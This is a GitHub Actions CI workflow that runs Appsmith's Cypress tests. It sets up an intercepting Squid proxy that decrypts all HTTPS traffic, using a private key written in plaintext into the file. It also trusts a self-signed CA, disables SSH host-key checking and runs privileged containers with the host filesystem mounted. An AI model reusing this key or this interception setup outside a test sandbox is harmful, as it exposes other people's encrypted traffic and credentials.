env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  ci-test:
    defaults:
      run:
        shell: bash
    runs-on: ubuntu-latest
    services:
      mongo:
        image: mongo
        ports:
        - 27017:27017
      redis:
        image: redis
        ports:
        - 6379:6379
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Set up Depot CLI
      uses: depot/setup-action@v1
    - continue-on-error: true
      name: Login to DockerHub
      uses: docker/login-action@v2
      with:
        password: ${{ secrets.DOCKER_HUB_ACCESS_TOKEN }}
        username: ${{ secrets.DOCKER_HUB_USERNAME }}
    - continue-on-error: true
      if: inputs.pr != 0
      name: Fork based /ok-to-test checkout
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
        ref: refs/pull/${{ inputs.pr }}/merge
    - continue-on-error: true
      if: inputs.pr == 0
      name: Checkout the head commit of the branch
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
    - continue-on-error: true
      id: timestamp
      run: echo "::set-output name=timestamp::$(date +'%Y-%m-%dT%H:%M:%S')"
    - continue-on-error: true
      id: cache-appsmith
      name: Restore the previous run result
      uses: actions/cache@v3
      with:
        key: ${{ github.run_id }}-${{ github.job }}-${{ matrix.job }}
        path: '~/run_result

          '
        restore-keys: '${{ github.run_id }}-${{ github.job }}-${{ matrix.job }}

          '
    - continue-on-error: true
      id: run_result
      if: steps.cache-appsmith.outputs.cache-hit == 'true'
      name: Get the previous run result
      run: 'run_result_env=$(cat ~/run_result)

        echo "run_result=$run_result_env" >> $GITHUB_OUTPUT

        '
    - continue-on-error: true
      env:
        STEPS_CONTEXT: ${{ toJson(steps) }}
      name: Dump steps context
      run: echo "$STEPS_CONTEXT"
    - continue-on-error: true
      if: steps.run_result.outputs.run_result == 'failedtest'
      run: echo "failed_spec_artifact=failed-spec-ci-$((${{github.run_attempt}}-1))"
        >> $GITHUB_ENV
    - continue-on-error: true
      if: steps.run_result.outputs.run_result == 'failedtest'
      name: Restore the previous failed combine result
      uses: actions/download-artifact@v3
      with:
        name: ${{ env.failed_spec_artifact }}
        path: ~/failed_spec_ci
    - continue-on-error: true
      id: failed_spec
      if: steps.run_result.outputs.run_result == 'failedtest'
      name: Get failed_spec
      run: "failed_spec_env=\"\"\nwhile IFS= read -r line || [ -n \"$line\" ]; do\n\
        \    file_path=$(echo \"$line\" | awk -F'/' '{print $(NF-1)\"/\"$NF}')\n \
        \   spec_name=$(echo \"$file_path\" | awk -F'/' '{print $NF}')\n    failed_spec=$(find\
        \ . -name \"$spec_name\" | sed 's|./||')\n    if [ \"$(echo \"$failed_spec\"\
        \ | wc -l)\" -eq 1 ]; then\n        failed_spec_env=\"$failed_spec_env,$failed_spec\"\
        \n    else\n      for file in $failed_spec; do\n          new_file_path=$(echo\
        \ \"$file\" | awk -F'/' '{print $(NF-1)\"/\"$NF}')\n          if [ \"$new_file_path\"\
        \ == \"$file_path\" ]; then\n              failed_spec_env=\"$failed_spec_env,$file\"\
        \n          fi\n      done\n    fi\ndone < ~/failed_spec_ci/failed_spec_ci-${{\
        \ matrix.job }}\nfailed_spec_env=${failed_spec_env#,}\necho \"failed_spec_env=$failed_spec_env\"\
        \ >> $GITHUB_ENV\n"
      working-directory: app/client
    - continue-on-error: true
      if: steps.run_result.outputs.run_result != 'success' && steps.run_result.outputs.run_result
        != 'failedtest'
      run: echo "Starting full run" && exit 0
    - continue-on-error: true
      if: steps.run_result.outputs.run_result == 'failedtest'
      run: echo "Rerunning failed tests" && exit 0
    - continue-on-error: true
      name: cat run_result
      run: echo ${{ steps.run_result.outputs.run_result }}
    - continue-on-error: true
      name: Setup mongodb-tools
      run: 'wget https://fastdl.mongodb.org/tools/db/mongodb-database-tools-ubuntu2204-x86_64-100.6.1.deb

        sudo apt install ./mongodb-database-tools-*-100.6.1.deb

        '
    - continue-on-error: true
      name: Download mongodb archive
      run: 'curl -o data.gz https://appsmithctl-backup-restore-test.s3.ap-south-1.amazonaws.com/docdb-data.gz

        '
    - continue-on-error: true
      name: Download Docker image artifact
      uses: actions/download-artifact@v3
      with:
        name: cicontainer
    - continue-on-error: true
      name: Load Docker image from tar file
      run: 'gunzip cicontainer.tar.gz

        docker load -i cicontainer.tar

        '
    - continue-on-error: true
      if: steps.run_result.outputs.run_result != 'success'
      name: Create folder
      run: 'mkdir -p cicontainerlocal/stacks/configuration/

        '
      working-directory: .
    - continue-on-error: true
      env:
        SSH_PRIVATE_KEY: ${{ secrets.APPSMITH_CI_TUNNEL_PRIVATE_KEY }}
      name: Set up SSH key for tunnel
      run: 'echo "$SSH_PRIVATE_KEY" > ssh_key.pem

        chmod 400 ssh_key.pem

        '
    - continue-on-error: true
      name: Setup SSH tunnel to AWS DocumentDB instance
      run: "chmod 400 ssh_key.pem \nssh -4 -o StrictHostKeyChecking=no -o ServerAliveInterval=180\
        \ -o ServerAliveCountMax=5 -i \"ssh_key.pem\" -L 0.0.0.0:27010:docdb-ansible-test-cluster.cluster-cz8diybf9wdj.ap-south-1.docdb.amazonaws.com:27017\
        \ ubuntu@65.1.106.35 -N -f\n"
    - continue-on-error: true
      env:
        APPSMITH_MONGODB_URI: ${{ secrets.INTERNAL_CI_DOC_DB_URI }}
      if: steps.run_result.outputs.run_result != 'success'
      name: Run Appsmith, CS & TED docker image
      run: "timestamp=$(date +%Y%m%d%H%M%S) \nhash=$(hostname)\nrandom=$(shuf -i 1000-9999\
        \ -n 1)\nDB_NAME=\"${timestamp}-${hash}-${random}\"\necho \"DB_NAME: ${DB_NAME}\"\
        \nMONGO_CREDS=$(echo $APPSMITH_MONGODB_URI | sed 's/@.*//')\nURI=\"${MONGO_CREDS}@localhost:27010/${DB_NAME}?retryWrites=false&replicaSet=rs0&directConnection=true\"\
        \ \nmongorestore --uri=\"${URI}\" --archive=data.gz --gzip --drop --nsInclude\
        \ \"doc-db-base.*\" --nsFrom \"doc-db-base.*\" --nsTo \"${DB_NAME}.*\"\nsudo\
        \ /etc/init.d/ssh stop ;\nmkdir -p ~/git-server/keys\nmkdir -p ~/git-server/repos\n\
        docker run --name test-event-driver -d -p 22:22 -p 5001:5001 -p 3306:3306\
        \ \\\n-p 5432:5432 -p 28017:27017 -p 25:25 -p 5000:5000 -p 3001:3000 -p 6001:6001\
        \ --privileged --pid=host --ipc=host --volume /:/host -v ~/git-server/keys:/git-server/keys\
        \ \\\n-v ~/git-server/repos:/git-server/repos  appsmith/test-event-driver:latest\n\
        docker run --name cloud-services -d -p 8000:80 -p 8090:8090 \\\n  --privileged\
        \ --pid=host --ipc=host --add-host=host.docker.internal:host-gateway\\\n \
        \ -e APPSMITH_CLOUD_SERVICES_MONGODB_URI=mongodb://host.docker.internal:27017\
        \ \\\n  -e APPSMITH_CLOUD_SERVICES_MONGODB_DATABASE=cs \\\n  -e APPSMITH_CLOUD_SERVICES_MONGODB_AUTH_DATABASE=admin\
        \ \\\n  -e APPSMITH_REDIS_URL=redis://host.docker.internal:6379/ \\\n  -e\
        \ APPSMITH_APPS_API_KEY=dummy-api-key \\\n  -e APPSMITH_REMOTE_API_KEY=dummy-api-key\
        \ \\\n  -e APPSMITH_GITHUB_API_KEY=dummy-appsmith-gh-api-key \\\n  -e APPSMITH_JWT_SECRET=appsmith-cloud-services-jwt-secret-dummy-key\
        \ \\\n  -e APPSMITH_ENCRYPTION_SALT=encryption-salt \\\n  -e APPSMITH_ENCRYPTION_PASSWORD=encryption-password\
        \ \\\n  -e APPSMITH_CLOUD_SERVICES_URL=https://cs-dev.appsmith.com \\\n  -e\
        \ APPSMITH_CUSTOMER_PORTAL_URL=https://dev.appsmith.com \\\n  -e APPSMITH_CLOUD_SERVICES_BASE_URL=https://cs-dev.appsmith.com\
        \ \\\n  -e APPSMITH_CLOUD_SERVER_BASE_URL=https://release.app.appsmith.com\
        \ \\\n  -e AUTH0_ISSUER_URL=https://login.release-customer.appsmith.com/ \\\
        \n  -e AUTH0_CLIENT_ID=dummy-client-id \\\n  -e AUTH0_CLIENT_SECRET=dummy-secret-id\
        \ \\\n  -e AUTH0_AUDIENCE_URL=https://login.local-customer.appsmith.com/ \\\
        \n  -e CLOUDSERVICES_URL=cs-dev.appsmith.com \\\n  -e CUSTOMER_URL=dev.appsmith.com\
        \  \\\n  -e ENTERPRISE_USER_NAME=ent-user@appsmith.com \\\n  -e ENTERPRISE_USER_PASSWORD=ent_user_password\
        \ \\\n  -e ENTERPRISE_ADMIN_NAME=ent-admin@appsmith.com \\\n  -e ENTERPRISE_ADMIN_PASSWORD=ent_admin_password\
        \ \\\n  appsmith/cloud-services:release\ncd cicontainerlocal\ndocker run -d\
        \ --name appsmith -p 80:80 -p 9001:9001 \\\n  -v \"$PWD/stacks:/appsmith-stacks\"\
        \ \\\n  -e APPSMITH_DISABLE_TELEMETRY=true \\\n  -e APPSMITH_INTERCOM_APP_ID=DUMMY_VALUE\
        \ \\\n  -e APPSMITH_CLOUD_SERVICES_BASE_URL=http://host.docker.internal:5001\
        \ \\\n  -e APPSMITH_MONGODB_URI=\"${APPSMITH_MONGODB_URI}${DB_NAME}?retryWrites=false&replicaSet=rs0&directConnection=true\"\
        \ \\\n  --add-host=host.docker.internal:host-gateway --add-host=api.segment.io:host-gateway\
        \ --add-host=t.appsmith.com:host-gateway \\\n  cicontainer\n"
      working-directory: .
    - continue-on-error: true
      if: steps.run_result.outputs.run_result != 'success'
      name: Use Node.js
      uses: actions/setup-node@v3
      with:
        node-version-file: app/client/package.json
    - continue-on-error: true
      if: steps.run_result.outputs.run_result != 'success'
      name: Restore Yarn cache
      uses: actions/cache@v3
      with:
        key: v1-yarn3-${{ hashFiles('app/client/yarn.lock') }}
        path: app/client/.yarn/cache
        restore-keys: 'v1-yarn3-

          '
    - continue-on-error: true
      if: steps.run_result.outputs.run_result != 'success'
      name: Install dependencies
      run: 'yarn install --immutable

        '
      working-directory: app/client
    - continue-on-error: true
      name: Wait until appsmith server is healthy
      run: 'bash scripts/health_check.sh

        '
    - continue-on-error: true
      env:
        APPSMITH_DISABLE_TELEMETRY: true
        APPSMITH_GOOGLE_MAPS_API_KEY: ${{ secrets.APPSMITH_GOOGLE_MAPS_API_KEY }}
        APPSMITH_SSL_CERTIFICATE: ${{ secrets.APPSMITH_SSL_CERTIFICATE }}
        APPSMITH_SSL_KEY: ${{ secrets.APPSMITH_SSL_KEY }}
        CYPRESS_AIRGAPPED: false
        CYPRESS_AIRTABLE_BEARER: ${{ secrets.AIRTABLE_BEARER }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO
          }}
        CYPRESS_EXCLUDE_TAGS: airgap
        CYPRESS_FIRESTORE_PRIVATE_KEY: ${{ secrets.FIRESTORE_PRIVATE_KEY }}
        CYPRESS_GITEA_TOKEN: ${{ secrets.GITEA_TOKEN }}
        CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN: ${{ secrets.CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN
          }}
        CYPRESS_OAUTH_SAML_EMAIL: ${{ secrets.CYPRESS_OAUTH_SAML_EMAIL }}
        CYPRESS_OAUTH_SAML_ENTITY_ID: ${{ secrets.CYPRESS_OAUTH_SAML_ENTITY_ID }}
        CYPRESS_OAUTH_SAML_METADATA_URL: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_URL
          }}
        CYPRESS_OAUTH_SAML_METADATA_XML: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_XML
          }}
        CYPRESS_OAUTH_SAML_PUB_CERT: ${{ secrets.CYPRESS_OAUTH_SAML_PUB_CERT }}
        CYPRESS_OAUTH_SAML_REDIRECT_URL: ${{ secrets.CYPRESS_OAUTH_SAML_REDIRECT_URL
          }}
        CYPRESS_OAUTH_SAML_SSO_URL: ${{ secrets.CYPRESS_OAUTH_SAML_SSO_URL }}
        CYPRESS_PASSWORD: ${{ secrets.CYPRESS_PASSWORD }}
        CYPRESS_S3_ACCESS_KEY: ${{ secrets.CYPRESS_S3_ACCESS_KEY }}
        CYPRESS_S3_SECRET_KEY: ${{ secrets.CYPRESS_S3_SECRET_KEY }}
        CYPRESS_TESTPASSWORD1: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD2: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD3: ${{ secrets.CYPRESS_TESTPASSWORD3 }}
        CYPRESS_TESTPASSWORD4: ${{ secrets.CYPRESS_TESTPASSWORD4 }}
        CYPRESS_TESTUSERNAME1: ${{ secrets.CYPRESS_TESTUSERNAME1 }}
        CYPRESS_TESTUSERNAME2: ${{ secrets.CYPRESS_TESTUSERNAME2 }}
        CYPRESS_TESTUSERNAME3: ${{ secrets.CYPRESS_TESTUSERNAME3 }}
        CYPRESS_TESTUSERNAME4: ${{ secrets.CYPRESS_TESTUSERNAME4 }}
        CYPRESS_TEST_GITHUB_USER_NAME: ${{ secrets.CYPRESS_TEST_GITHUB_USER_NAME }}
        CYPRESS_USERNAME: ${{ secrets.CYPRESS_USERNAME }}
        CYPRESS_VERIFY_TIMEOUT: 100000
        POSTGRES_PASSWORD: postgres
      if: steps.run_result.outputs.run_result != 'success'
      name: Setting up the cypress tests
      run: 'cd app/client

        chmod a+x ./cypress/setup-test-ci.sh

        ./cypress/setup-test-ci.sh

        '
      shell: bash
    - continue-on-error: true
      uses: browser-actions/setup-chrome@latest
      with:
        chrome-version: stable
    - continue-on-error: true
      run: 'echo "BROWSER_PATH=$(which chrome)" >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Save Git values
      run: 'PR_NUMBER=${{ inputs.pr }}

        echo COMMIT_INFO_BRANCH=$(git rev-parse --abbrev-ref HEAD) >> $GITHUB_ENV

        echo COMMIT_INFO_MESSAGE=OkToTest run on PR# ${{ inputs.pr }} >> $GITHUB_ENV

        echo COMMIT_INFO_EMAIL=$(git show -s --pretty=%ae) >> $GITHUB_ENV

        echo COMMIT_INFO_AUTHOR=$(git show -s --pretty=%an) >> $GITHUB_ENV

        echo COMMIT_INFO_SHA=$(git show -s --pretty=%H) >> $GITHUB_ENV

        echo COMMIT_INFO_TIMESTAMP=$(git show -s --pretty=%ct) >> $GITHUB_ENV

        echo COMMIT_INFO_REMOTE=$(git config --get remote.origin.url) >> $GITHUB_ENV

        # delete the .git folder afterwords to use the environment values

        rm -rf .git

        '
    - continue-on-error: true
      name: Show Git values
      run: 'echo Branch $COMMIT_INFO_BRANCH

        echo Message $COMMIT_INFO_MESSAGE

        echo Email $COMMIT_INFO_EMAIL

        echo Author $COMMIT_INFO_AUTHOR

        echo SHA $COMMIT_INFO_SHA

        echo Timestamp $COMMIT_INFO_TIMESTAMP

        echo Remote $COMMIT_INFO_REMOTE

        '
    - continue-on-error: true
      env:
        EVENT_COMMITS: ${{ toJson(github.event.commits[0].message) }}
      name: Set Commit Message
      run: "if [[ ${{ inputs.pr }} -ne 0 ]]; then\n  echo \"COMMIT_INFO_MESSAGE=${{\
        \ env.COMMIT_INFO_MESSAGE }}\" >> $GITHUB_ENV\nelse\n  if [[ '${{env.EVENT_COMMITS}}'\
        \ == 'null' ]]; then \n    echo \"COMMIT_INFO_MESSAGE=${{ github.event_name\
        \ }} by ${{ env.COMMIT_INFO_AUTHOR }}\" >> $GITHUB_ENV\n  else\n    echo \"\
        COMMIT_INFO_MESSAGE=$(echo \\\"${{ env.EVENT_COMMITS }}\\\" | awk -F '\\\\\
        \\\\n' '{print $1}' | sed 's/^\\\"//')\" >> $GITHUB_ENV\n  fi\nfi\n"
    - continue-on-error: true
      env:
        APPSMITH_DISABLE_TELEMETRY: true
        APPSMITH_GOOGLE_MAPS_API_KEY: ${{ secrets.APPSMITH_GOOGLE_MAPS_API_KEY }}
        ATTEMPT_NUMBER: ${{ github.run_attempt }}
        BRANCH: ${{ env.COMMIT_INFO_BRANCH }}
        COMMITTER: ${{ env.COMMIT_INFO_AUTHOR }}
        COMMIT_INFO_MESSAGE: ${{ env.COMMIT_INFO_MESSAGE }}
        CYPRESS_AIRGAPPED: false
        CYPRESS_AIRTABLE_BEARER: ${{ secrets.AIRTABLE_BEARER }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET
          }}
